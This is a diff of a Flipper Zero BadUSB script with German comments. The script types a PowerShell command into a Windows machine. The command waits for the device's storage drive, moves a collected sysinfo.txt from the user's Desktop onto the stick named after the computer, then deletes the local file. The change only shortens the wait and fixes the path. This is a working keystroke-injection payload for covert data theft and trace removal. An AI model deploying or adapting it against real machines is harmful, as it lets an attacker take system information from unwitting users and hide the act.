@@ -66,9 +66,9 @@ badusb.press("GUI","r");
 delay (500);
 badusb.println("powershell");
 delay (500);
-//powershell wartet jetzt 45 sekunden bis flipper usb-stick geladen wurde und ermittelt den Laufwerksbuchstaben - kopiert die sysinfo.txt vom Desktop auf den Stick und löscht sie anschließend vom Desktop
+//powershell wartet jetzt 30 sekunden bis flipper usb-stick geladen wurde und ermittelt den Laufwerksbuchstaben - kopiert die sysinfo.txt vom Desktop auf den Stick und löscht sie anschließend vom Desktop
 //wir müssen hier den badusb trennen und den stick verbinden
-badusb.println("Start-Sleep 45; $DriveLetter = Get-Disk -FriendlyName 'Flipper Mass Storage' | Get-Partition | Get-Volume | Select-Object -ExpandProperty DriveLetter; Move-Item -Path C:\\Users\${env:username}\\sysinfo.txt -Destination ${DriveLetter}:\\${env:computername}_sysinfo.txt; Remove-Item C:\\Users\${env:username}\\sysinfo.txt; exit");
+badusb.println("Start-Sleep 30; $DriveLetter = Get-Disk -FriendlyName 'Flipper Mass Storage' | Get-Partition | Get-Volume | Select-Object -ExpandProperty DriveLetter; Move-Item -Path C:\\Users\\${env:username}\\Desktop\\sysinfo.txt -Destination ${DriveLetter}:\\${env:computername}_sysinfo.txt; Remove-Item C:\\Users\\${env:username}\\Desktop\\sysinfo.txt; exit");
 badusb.quit();
 print ("Bad-USB trennen....");
 delay (2000);
